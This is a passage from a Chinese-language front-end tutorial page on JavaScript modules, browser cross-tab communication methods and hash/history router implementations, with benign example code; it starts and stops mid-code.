class="hljs-keyword">const</span> <span class="hljs-title class_">RemoteButton</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;app1/Button&#x27;</span>));<br></code></pre></td></tr></table></figure><h2 id="模块化工程实践"><a href="#模块化工程实践" class="headerlink" title="模块化工程实践"></a>模块化工程实践</h2><p><strong>项目结构示例</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">src/<br>├── components/     <span class="hljs-comment">// 可复用UI组件</span><br>├── features/       <span class="hljs-comment">// 功能模块</span><br>│   ├── auth/       <span class="hljs-comment">// 认证模块</span><br>│   │   ├── api.<span class="hljs-property">js</span><br>│   │   ├── store.<span class="hljs-property">js</span><br>│   │   └── components/<br>├── lib/            <span class="hljs-comment">// 工具库</span><br>├── services/       <span class="hljs-comment">// API服务层</span><br>└── index.<span class="hljs-property">js</span>        <span class="hljs-comment">// 应用入口</span><br></code></pre></td></tr></table></figure><p><strong>模块设计原则</strong></p><ol><li>单一职责原则：每个模块只解决一个问题</li><li>高内聚低耦合：模块内部紧密相连，模块间依赖最小化</li><li>明确接口：导出必要的变量&#x2F;函数，隐藏内部实现细节</li><li>无副作用导入：避免在导入时执行操作（初始化除外）</li><li>稳定抽象：模块接口应向后兼容</li></ol><p><strong>性能优化策略</strong></p><ol><li>代码分割：路由级&#x2F;组件级动态导入</li><li>共享依赖：避免重复打包（webpack 的 splitChunks）</li><li>Tree shaking：配合 ESM 静态结构实现</li></ol><h2 id="常见问题与解决方案"><a href="#常见问题与解决方案" class="headerlink" title="常见问题与解决方案"></a>常见问题与解决方案</h2><p><strong>循环引用陷阱</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 解决方案：函数导出延迟访问</span><br><span class="hljs-comment">// a.js</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getA</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> a; &#125;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">let</span> a = <span class="hljs-string">&#x27;A&#x27;</span>;<br><br><span class="hljs-comment">// b.js</span><br><span class="hljs-keyword">import</span> &#123; getA &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./a.js&#x27;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getA</span>()); <span class="hljs-comment">// &#x27;A&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>默认导入与命名导入</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 模块定义</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/*...*/</span> &#125;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">helper</span> = (<span class="hljs-params"></span>) =&gt; &#123; <span class="hljs-comment">/*...*/</span> &#125;;<br><br><span class="hljs-comment">// 导入方式</span><br><span class="hljs-keyword">import</span> myMain, &#123; helper &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./module.js&#x27;</span>;<br></code></pre></td></tr></table></figure><p><strong>动态路径问题</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 错误：无法静态分析</span><br><span class="hljs-keyword">import</span> <span class="hljs-variable language_">module</span> <span class="hljs-keyword">from</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;path&#125;</span>/module.js`</span>;<br><br><span class="hljs-comment">// 正确：使用import()函数</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;path&#125;</span>/module.js`</span>);<br></code></pre></td></tr></table></figure><h1 id="浏览器跨标签通信"><a href="#浏览器跨标签通信" class="headerlink" title="浏览器跨标签通信"></a>浏览器跨标签通信</h1><p>跨标签通信是指在不同的浏览器标签页（或窗口）之间进行数据传递和消息通信。这在现代Web应用中非常有用，比如同步多个标签页的状态、通知数据更新等。跨标签通信的几种常见方式：</p><ol><li>Broadcast Channel API</li><li>SharedWorker</li><li>LocalStorage 和 Storage 事件</li><li>Window.postMessage</li><li>Cookies 和 轮询</li><li>IndexedDB 和 轮询</li><li>Service Worker</li></ol><h2 id="Broadcast-Channel-API"><a href="#Broadcast-Channel-API" class="headerlink" title="Broadcast Channel API"></a>Broadcast Channel API</h2><p><strong>原理</strong></p><p>基于发布订阅模式，创建命名频道实现广播通信</p><p><strong>代码示例</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 标签页 A（发送方）</span><br><span class="hljs-keyword">const</span> bc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BroadcastChannel</span>(<span class="hljs-string">&#x27;app_channel&#x27;</span>);<br>bc.<span class="hljs-title function_">postMessage</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;USER_UPDATE&#x27;</span>, <span class="hljs-attr">data</span>: user &#125;);<br><br><span class="hljs-comment">// 标签页 B（接收方）</span><br><span class="hljs-keyword">const</span> bc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BroadcastChannel</span>(<span class="hljs-string">&#x27;app_channel&#x27;</span>);<br>bc.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span>(event.<span class="hljs-property">data</span>.<span class="hljs-property">type</span> === <span class="hljs-string">&#x27;USER_UPDATE&#x27;</span>) &#123;<br>    <span class="hljs-title function_">updateUI</span>(event.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>);<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>优点</strong></p><ul><li>原生支持，API 简洁</li><li>支持任意同源页面（包括 iframe）</li></ul><p><strong>缺点</strong></p><ul><li>不兼容 IE&#x2F;Edge &lt;79</li><li>无法跨域通信<ul><li>适用场景：现代浏览器下的同源应用状态同步</li></ul></li></ul><h2 id="SharedWorker"><a href="#SharedWorker" class="headerlink" title="SharedWorker"></a>SharedWorker</h2><p><strong>原理</strong></p><p>共享 Web Worker 作为消息中继站</p><p><strong>创建步骤</strong></p><p>(1) 创建共享 Worker 文件 worker.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> ports = [];<br>onconnect = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> port = e.<span class="hljs-property">ports</span>[<span class="hljs-number">0</span>];<br>  ports.<span class="hljs-title function_">push</span>(port);<br>  port.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>    ports.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span>(p !== port) p.<span class="hljs-title function_">postMessage</span>(event.<span class="hljs-property">data</span>);<br>    &#125;);<br>  &#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>(2) 页面代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 所有标签页</span><br><span class="hljs-keyword">const</span> worker = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SharedWorker</span>(<span class="hljs-string">&#x27;worker.js&#x27;</span>);<br>worker.<span class="hljs-property">port</span>.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> <span class="hljs-title function_">handleEvent</span>(e.<span class="hljs-property">data</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">broadcast</span> = (<span class="hljs-params">data</span>) =&gt; worker.<span class="hljs-property">port</span>.<span class="hljs-title function_">postMessage</span>(data);<br></code></pre></td></tr></table></figure><p><strong>优点</strong></p><ul><li>真正的全局通信枢纽</li><li>避免轮询性能损耗</li></ul><p><strong>缺点</strong></p><ul><li>调试复杂（Chrome:&#x2F;&#x2F;inspect 调试 Worker）</li><li>需要处理端口生命周期<ul><li>适用场景：复杂应用的多 Tab 数据同步（如金融仪表盘）</li></ul></li></ul><h2 id="localStorage-storage-事件"><a href="#localStorage-storage-事件" class="headerlink" title="localStorage + storage 事件"></a>localStorage + storage 事件</h2><p><strong>原理</strong></p><p>利用 storage 事件监听存储变化</p><p><strong>代码示例</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 发送方</span><br><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;sync_data&#x27;</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(payload));<br><br><span class="hljs-comment">// 接收方</span><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;storage&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span>(e.<span class="hljs-property">key</span> === <span class="hljs-string">&#x27;sync_data&#x27;</span>) &#123;<br>    <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(e.<span class="hljs-property">newValue</span>);<br>    <span class="hljs-title function_">handleDataUpdate</span>(data);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>关键细节</strong></p><ul><li>事件在同域名其他标签页触发（当前页不触发）</li><li>使用 JSON.stringify 避免对象引用问题</li><li>需要清理过期数据（removeItem）</li><li>适用场景：简单状态同步（用户登录状态切换）</li></ul><h2 id="window-postMessage"><a href="#window-postMessage" class="headerlink" title="window.postMessage"></a>window.postMessage</h2><p><strong>原理</strong></p><p>通过窗口引用直接通信</p><p><strong>代码示例</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 父页面打开子页面</span><br><span class="hljs-keyword">const</span> childWindow = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;child.html&#x27;</span>);<br><br><span class="hljs-comment">// 父页面向子页面发送</span><br>childWindow.<span class="hljs-title function_">postMessage</span>(&#123; <span class="hljs-attr">authToken</span>: <span class="hljs-string">&#x27;xyz&#x27;</span> &#125;, <span class="hljs-string">&#x27;https://app.com&#x27;</span>);<br><br><span class="hljs-comment">// 子页面接收</span><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span>(e.<span class="hljs-property">origin</span> !== <span class="hljs-string">&#x27;https://app.com&#x27;</span>) <span class="hljs-keyword">return</span>;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e.<span class="hljs-property">data</span>.<span class="hljs-property">authToken</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>安全要点</strong></p><ul><li>必须验证 event.origin</li><li>敏感操作需增加消息来源白名单</li><li>适用场景：跨域通信（主站与子站交互）</li></ul><h2 id="Service-Worker-消息代理"><a href="#Service-Worker-消息代理" class="headerlink" title="Service Worker 消息代理"></a>Service Worker 消息代理</h2><p><strong>原理</strong></p><p>利用 Service Worker 作为消息中心</p><p><strong>实现模式</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Service Worker 中</span><br>self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">waitUntil</span>(<br>    clients.<span class="hljs-title function_">matchAll</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">all</span> =&gt;</span> &#123;<br>      all.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">client</span> =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span>(client.<span class="hljs-property">id</span> !== event.<span class="hljs-property">source</span>.<span class="hljs-property">id</span>) &#123;<br>          client.<span class="hljs-title function_">postMessage</span>(event.<span class="hljs-property">data</span>);<br>        &#125;<br>      &#125;);<br>    &#125;)<br>  );<br>&#125;);<br><br><span class="hljs-comment">// 页面中</span><br>navigator.<span class="hljs-property">serviceWorker</span>.<span class="hljs-property">controller</span>.<span class="hljs-title function_">postMessage</span>(payload);<br></code></pre></td></tr></table></figure><p><strong>优势</strong></p><ul><li>支持离线消息中转</li><li>可配合 Push API 实现后台通知</li><li>适用场景：PWA 应用的全栈消息系统</li></ul><h2 id="IndexedDB-轮询（兼容方案）"><a href="#IndexedDB-轮询（兼容方案）" class="headerlink" title="IndexedDB + 轮询（兼容方案）"></a>IndexedDB + 轮询（兼容方案）</h2><p><strong>原理</strong></p><p>共享数据库 + 定时查询</p><p><strong>代码示例</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 发送方</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">writeUpdate</span>(<span class="hljs-params">data</span>) &#123;<br>  <span class="hljs-keyword">const</span> tx = db.<span class="hljs-title function_">transaction</span>(<span class="hljs-string">&#x27;updates&#x27;</span>, <span class="hljs-string">&#x27;readwrite&#x27;</span>);<br>  tx.<span class="hljs-title function_">objectStore</span>(<span class="hljs-string">&#x27;updates&#x27;</span>).<span class="hljs-title function_">put</span>(&#123; <br>    <span class="hljs-attr">id</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(), <br>    data <br>  &#125;);<br>&#125;<br><br><span class="hljs-comment">// 接收方（每2秒检查）</span><br><span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> tx = db.<span class="hljs-title function_">transaction</span>(<span class="hljs-string">&#x27;updates&#x27;</span>, <span class="hljs-string">&#x27;readonly&#x27;</span>);<br>  <span class="hljs-keyword">const</span> store = tx.<span class="hljs-title function_">objectStore</span>(<span class="hljs-string">&#x27;updates&#x27;</span>);<br>  store.<span class="hljs-title function_">openCursor</span>().<span class="hljs-property">onsuccess</span> = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> cursor = e.<span class="hljs-property">target</span>.<span class="hljs-property">result</span>;<br>    <span class="hljs-keyword">if</span>(cursor) &#123;<br>      <span class="hljs-title function_">handleUpdate</span>(cursor.<span class="hljs-property">value</span>.<span class="hljs-property">data</span>);<br>      cursor.<span class="hljs-title function_">delete</span>(); <span class="hljs-comment">// 消费后删除</span><br>    &#125;<br>  &#125;;<br>&#125;, <span class="hljs-number">2000</span>);<br></code></pre></td></tr></table></figure><p><strong>适用场景</strong></p><ul><li>需要数据持久化的低频操作（如日志收集）</li></ul><h2 id="基于-Cookie-的轮询（传统方案）"><a href="#基于-Cookie-的轮询（传统方案）" class="headerlink" title="基于 Cookie 的轮询（传统方案）"></a>基于 Cookie 的轮询（传统方案）</h2><p><strong>原理</strong></p><p>共享 Cookie + 定时读取</p><p><strong>代码示例</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 发送方</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">`sync_flag=<span class="hljs-subst">$&#123;<span class="hljs-built_in">Date</span>.now()&#125;</span>; path=/`</span>;<br><br><span class="hljs-comment">// 接收方</span><br><span class="hljs-keyword">let</span> lastValue = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> current = <span class="hljs-title function_">getCookie</span>(<span class="hljs-string">&#x27;sync_flag&#x27;</span>);<br>  <span class="hljs-keyword">if</span>(current !== lastValue) &#123;<br>    lastValue = current;<br>    <span class="hljs-title function_">triggerSync</span>();<br>  &#125;<br>&#125;, <span class="hljs-number">1000</span>);<br></code></pre></td></tr></table></figure><p><strong>缺点</strong></p><ul><li>性能开销大（不推荐高频使用）</li><li>存储空间有限（4KB）</li><li>适用场景：兼容 IE8 等老旧浏览器</li></ul><h2 id="方案选型决策策略"><a href="#方案选型决策策略" class="headerlink" title="方案选型决策策略"></a>方案选型决策策略</h2><pre class="mermaid">graph TD    A[需要兼容 IE?] -->|是| B(localStorage/Cookie)    A -->|否| C[需要离线支持?]    C -->|是| D(Service Worker)    C -->|否| E[需要跨域?]    E -->|是| F(window.postMessage)    E -->|否| G[通信频率?]    G -->高频 --> H(BroadcastChannel)    G -->低频 --> I(SharedWorker)</pre><h2 id="面试要点"><a href="#面试要点" class="headerlink" title="面试要点"></a>面试要点</h2><ul><li>同源策略：除 postMessage 外所有方案均受同源限制</li><li>性能考量：避免轮询方案用于高频场景</li><li>安全实践：<ul><li>postMessage 必须验证 origin</li><li>localStorage 避免存储敏感数据</li></ul></li><li>现代方案：优先推荐 BroadcastChannel + SharedWorker</li><li>异常处理：Worker 需监听 error 事件，localStorage 需 try&#x2F;catch</li></ul><h2 id="进阶问题"><a href="#进阶问题" class="headerlink" title="进阶问题"></a>进阶问题</h2><p><strong>Q：如何实现浏览器完全关闭后的状态同步？</strong></p><p>需结合服务端方案（WebSocket 连接 + 本地存储恢复），在页面加载时从服务端获取最新状态。</p><pre class="mermaid">sequenceDiagram    participant User    participant Browser    participant ServiceWorker    participant Server        User->>Browser: 打开应用    Browser->>ServiceWorker: 检查缓存状态    ServiceWorker->>Browser: 返回缓存状态    Browser->>User: 立即显示界面        par 并行处理        Browser->>Server: 请求最新状态        Server->>Browser: 返回状态数据    and        ServiceWorker->>Server: 预加载关键资源    end        Browser->>Browser: 比较缓存与最新状态    alt 状态有更新        Browser->>Browser: 增量更新UI        Browser->>ServiceWorker: 缓存新状态    else 状态无更新        Browser->>Browser: 保持当前状态    end</pre><h1 id="前端路由原理"><a href="#前端路由原理" class="headerlink" title="前端路由原理"></a>前端路由原理</h1><h2 id="核心原理概述"><a href="#核心原理概述" class="headerlink" title="核心原理概述"></a>核心原理概述</h2><p>前端路由的本质是通过监听 URL 的变化，在不刷新页面的情况下更新视图，主要通过两种模式实现：</p><ul><li>Hash 模式</li><li>History 模式</li></ul><h2 id="Hash-模式（锚点路由）"><a href="#Hash-模式（锚点路由）" class="headerlink" title="Hash 模式（锚点路由）"></a>Hash 模式（锚点路由）</h2><p><strong>实现原理</strong></p><ul><li>利用 URL 中 # 后面的部分（hash）的变化不会触发页面刷新</li><li>监听 hashchange 事件响应路由变化</li><li>通过 location.hash 获取当前路由状态</li></ul><p><strong>核心代码实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HashRouter</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">routes</span> = &#123;&#125;;<br>    <br>    <span class="hljs-comment">// 初始化监听</span><br>    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;load&#x27;</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleRouteChange</span>());<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;hashchange&#x27;</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleRouteChange</span>());<br>  &#125;<br>  <br>  <span class="hljs-comment">// 注册路由</span><br>  <span class="hljs-title function_">addRoute</span>(<span class="hljs-params">path, callback</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">routes</span>[path] = callback || <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;;<br>  &#125;<br>  <br>  <span class="hljs-comment">// 路由变化处理</span><br>  <span class="hljs-title function_">handleRouteChange</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> currentHash = location.<span class="hljs-property">hash</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>) || <span class="hljs-string">&#x27;/&#x27;</span>;<br>    <span class="hljs-keyword">const</span> routeHandler = <span class="hljs-variable language_">this</span>.<span class="hljs-property">routes</span>[currentHash];<br>    <br>    <span class="hljs-keyword">if</span> (routeHandler) &#123;<br>      <span class="hljs-title function_">routeHandler</span>();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// 404处理</span><br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">routes</span>[<span class="hljs-string">&#x27;/404&#x27;</span>]?.();<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-comment">// 导航方法</span><br>  <span class="hljs-title function_">navigate</span>(<span class="hljs-params">path</span>) &#123;<br>    location.<span class="hljs-property">hash</span> = <span class="hljs-string">`#<span class="hljs-subst">$&#123;path&#125;</span>`</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 使用示例</span><br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashRouter</span>();<br>router.<span class="hljs-title function_">addRoute</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">renderHomePage</span>());<br>router.<span class="hljs-title function_">addRoute</span>(<span class="hljs-string">&#x27;/about&#x27;</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">renderAboutPage</span>());<br>router.<span class="hljs-title function_">addRoute</span>(<span class="hljs-string">&#x27;/404&#x27;</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">renderNotFound</span>());<br></code></pre></td></tr></table></figure><p><strong>优缺点分析</strong></p><table><thead><tr><th align="left">优点</th><th align="left">缺点</th></tr></thead><tbody><tr><td align="left">✅ 兼容性好（IE8+）</td><td align="left">❌ URL中包含#不美观</td></tr><tr><td align="left">✅ 无需服务器配置</td><td align="left">❌ SEO支持有限</td></tr><tr><td align="left">✅ 实现简单</td><td align="left">❌ 只能使用字符串传参</td></tr></tbody></table><h2 id="History-模式（HTML5路由）"><a href="#History-模式（HTML5路由）" class="headerlink" title="History 模式（HTML5路由）"></a>History 模式（HTML5路由）</h2><p><strong>实现原理</strong></p><ul><li>使用 HTML5 History API (pushState, replaceState)</li><li>监听 popstate 事件响应路由变化</li><li>通过 location.pathname 获取当前路径</li></ul><p><strong>核心 API</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 添加新历史记录</span><br>history.<span class="hljs-title function_">pushState</span>(state, title, url);<br><br><span class="hljs-comment">// 替换当前历史记录</span><br>history.<span class="hljs-title function_">replaceState</span>(state, title, url);<br><br><span class="hljs-comment">// 监听历史记录变化</span><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;popstate&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;路由变化:&#x27;</span>, location.<span class="hljs-property">pathname</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>完整实现方案</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HistoryRouter</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">routes</span> = &#123;&#125;;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">init</span>();<br>  &#125;<br>  <br>  <span class="hljs-title function_">init</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 拦截所有链接点击</span><br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span 